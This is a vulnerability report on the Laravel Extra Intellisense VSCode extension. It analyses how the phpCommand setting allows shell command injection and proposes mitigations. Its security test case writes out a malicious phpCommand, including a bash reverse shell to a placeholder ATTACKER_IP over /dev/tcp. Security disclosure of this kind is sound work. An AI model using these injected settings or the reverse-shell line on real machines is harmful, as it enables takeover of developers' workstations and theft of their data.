## Vulnerability List for Laravel Extra Intellisense

- **Vulnerability Name:** Potential Remote Code Execution due to `phpCommand` Configuration

- **Description:**
    1. The "Laravel Extra Intellisense" extension executes PHP code from within the VSCode environment to provide autocompletion features for various Laravel functionalities like views, routes, models, etc.
    2. The extension relies on the `phpCommand` configuration setting to specify the command used to execute PHP code. This setting is user-configurable, allowing users to potentially modify the PHP execution command.
    3. The `Helpers::runPhp` function in `/code/src/helpers.ts` is a central function responsible for executing PHP code snippets. It directly utilizes the `phpCommand` setting to construct and execute shell commands.
    4. While the extension attempts basic escaping of double quotes and some characters on Unix-like systems in the generated PHP code, these measures are insufficient to prevent command injection. The core issue lies in the unsafe construction and execution of shell commands based on user-controlled configuration.
    5. An attacker who can compromise a developer's environment or influence their VSCode configuration can set a malicious `phpCommand`. This is a significant risk in supply chain attacks or compromised development environments.
    6. Subsequently, whenever the extension needs to execute PHP code for any of its features (e.g., autocompletion for routes, views, models, as demonstrated in files like `/code/src/ViewProvider.ts`, `/code/src/RouteProvider.ts`, `/code/src/EloquentProvider.ts`, etc.), the compromised `phpCommand` will be used.
    7. This leads to arbitrary command execution on the developer's machine with the privileges of the VSCode process, effectively resulting in Remote Code Execution. The impact is not limited to a specific feature but affects all functionalities relying on `Helpers::runLaravel` and consequently `Helpers::runPhp`.
    8. For example, setting `phpCommand` to `bash -c "{code}"` will interpret the `{code}` placeholder (intended for PHP code) as a shell command, leading to its execution in a shell environment.

- **Impact:**
    - Successful exploitation of this vulnerability grants an attacker the ability to execute arbitrary commands on the developer's machine running VSCode with the Laravel Extra Intellisense extension.
    - This can lead to severe consequences, including:
        - Full system compromise and control.
        - Theft of sensitive data, including source code, credentials, and other development-related information.
        - Installation of malware, backdoors, or ransomware on the developer's workstation.
        - Potential compromise of projects being developed on the affected machine.
    - The impact is critical as it directly targets the developer's workstation, which is a high-value target in software development and supply chains.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - Basic double quote escaping in the generated PHP code within `Helpers::runPhp`: `code = code.replace(/\"/g, "\\\"");`.
    - Attempted escaping of dollar signs and potentially single/double quotes on Unix-like systems, but the logic is unclear and likely ineffective:
        ```typescript
        if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
            code = code.replace(/\$/g, "\\$");
            code = code.replace(/\\\\'/g, '\\\\\\\\\'');
            code = code.replace(/\\\\"/g, '\\\\\\\\\"');
        }
        ```
    - Error messages are displayed in the VSCode output channel if PHP execution fails, which can aid in debugging but does not prevent the vulnerability itself.
    - A "Security Note" in `README.md` warns users about potential risks and suggests temporary disabling of the extension for sensitive code. This is a documentation-level warning and not a technical mitigation.

- **Missing Mitigations:**
    - **Input Validation and Sanitization for `phpCommand`:** The extension lacks any validation or sanitization of the user-provided `phpCommand` configuration. It should enforce a strict whitelist of allowed commands, ideally only permitting the direct execution of the PHP interpreter with specific and safe arguments. It should prevent any shell command injection attempts within the configuration value itself.
    - **Sandboxing and Isolation of PHP Execution:** The extension should execute the PHP code in a sandboxed or isolated environment with minimal privileges. This could involve using secure execution environments or containers to limit the impact of any potential code execution vulnerabilities.
    - **Secure Command Construction:** The current approach of directly replacing the `{code}` placeholder in the `phpCommand` template is fundamentally insecure. A safer method for command construction is needed, such as using parameterized command execution or escaping mechanisms that are robust against shell injection.
    - **Principle of Least Privilege:** The extension likely runs with the same privileges as VSCode, which inherits the developer's user privileges. Reducing the privileges required for the extension to operate could limit the potential damage from a successful exploit. The extension should ideally only require minimal necessary permissions.
    - **Content Security Policy (CSP) for Extension Settings:** Consider implementing a Content Security Policy (CSP) or similar mechanism for the extension's settings, including `phpCommand`, to restrict the possible values and prevent the introduction of malicious commands.

- **Preconditions:**
    - The attacker must be able to modify the `LaravelExtraIntellisense.phpCommand` configuration setting in a developer's VSCode environment. This could be achieved through:
        - Compromising the developer's machine directly.
        - Supply chain attacks targeting developer tools or dependencies.
        - Social engineering or phishing attacks to trick developers into modifying their VSCode settings.
    - The developer must have a Laravel project open in VSCode and be actively using the "Laravel Extra Intellisense" extension within that project.
    - The extension must be triggered to execute PHP code. This happens automatically when using autocompletion features in PHP or Blade files within a Laravel project.

- **Source Code Analysis:**
    - **`/code/src/helpers.ts` - `Helpers::runPhp` function:**
        ```typescript
        static async runPhp(code: string, description: string|null = null) : Promise<string> {
            code = code.replace(/\"/g, "\\\"");
            if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
                code = code.replace(/\$/g, "\\$");
                code = code.replace(/\\\\'/g, '\\\\\\\\\'');
                code = code.replace(/\\\\"/g, '\\\\\\\\\"');
            }
            let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
            let command = commandTemplate.replace("{code}", code);
            // ... execution using cp.exec(command) ...
        }
        ```
        - The function receives PHP code as input (`code`) and an optional description.
        - It attempts to escape double quotes and some characters on Unix-like systems, but this escaping is superficial and not robust against command injection.
        - It retrieves the `phpCommand` from the user's VSCode configuration, defaulting to `php -r "{code}"` if no custom command is set.
        - The core vulnerability lies in the line `let command = commandTemplate.replace("{code}", code);`. This line directly substitutes the `{code}` placeholder in the `commandTemplate` with the (partially escaped) PHP code. This simple string replacement is highly susceptible to command injection if a malicious `phpCommand` is configured.
        - Finally, `cp.exec(command)` executes the constructed command in a shell. If `command` is maliciously crafted, it will execute arbitrary shell commands.
    - **Usage across Providers:** Files like `/code/src/ViewProvider.ts`, `/code/src/AuthProvider.ts`, `/code/src/MiddlewareProvider.ts`, `/code/src/RouteProvider.ts`, `/code/src/AssetProvider.ts`, `/code/src/EloquentProvider.ts`, `/code/src/MixProvider.ts`, and `/code/src/ViteProvider.ts` all demonstrate the usage of `Helpers::runLaravel` to fetch data for autocompletion. `Helpers::runLaravel` internally uses `Helpers::runPhp`. This means that all autocompletion features of the extension that rely on executing Laravel/PHP code are potentially vulnerable if the `phpCommand` is compromised.

- **Security Test Case:**
    1. **Precondition:** Ensure VSCode is installed with the "Laravel Extra Intellisense" extension. Open a Laravel project in VSCode.
    2. **Set Malicious `phpCommand`:** In VSCode settings, navigate to "Laravel Extra Intellisense" extension settings and change the `LaravelExtraIntellisense.phpCommand` setting to: `bash -c "{code}"`. This configuration will interpret and execute the `{code}` content as a shell command.
    3. **Trigger Extension Functionality:** Open any PHP file within the Laravel project (e.g., a controller, route file, or Blade template).
    4. **Invoke Autocompletion:** Trigger the extension's autocompletion feature. For example, in a PHP file, type `config('app.name');` or start typing `Route::` or `view('`. This will initiate the extension's code completion logic and call `Helpers::runLaravel` which in turn uses `Helpers::runPhp`.
    5. **Observe Command Execution (Example - Listing Directory):** To verify command execution, modify the malicious `phpCommand` to: `bash -c "touch /tmp/vscode_rce_test_$(date +%s).txt; {code}"`. This command will attempt to create a timestamped file in the `/tmp/` directory and then execute the intended PHP code (which will likely fail as it's being run as bash).
    6. **Verify File Creation:** After triggering autocompletion, check if files named `vscode_rce_test_<timestamp>.txt` are created in the `/tmp/` directory. The presence of these files confirms that arbitrary shell commands are being executed due to the malicious `phpCommand` configuration.
    7. **Further RCE Verification (Example - Reverse Shell):** For more advanced testing, you can try to establish a reverse shell by setting `phpCommand` to something like: `bash -c "bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1; {code}"` (replace `ATTACKER_IP` and `ATTACKER_PORT` with your attacker machine's IP and listening port). Triggering autocompletion should then initiate a reverse shell connection back to your attacker machine, providing full remote code execution.
    8. **Expected Result:** Successful execution of shell commands defined in the malicious `phpCommand` configuration whenever the extension attempts to execute PHP code for autocompletion. This clearly demonstrates Remote Code Execution vulnerability due to insecure handling of the `phpCommand` configuration.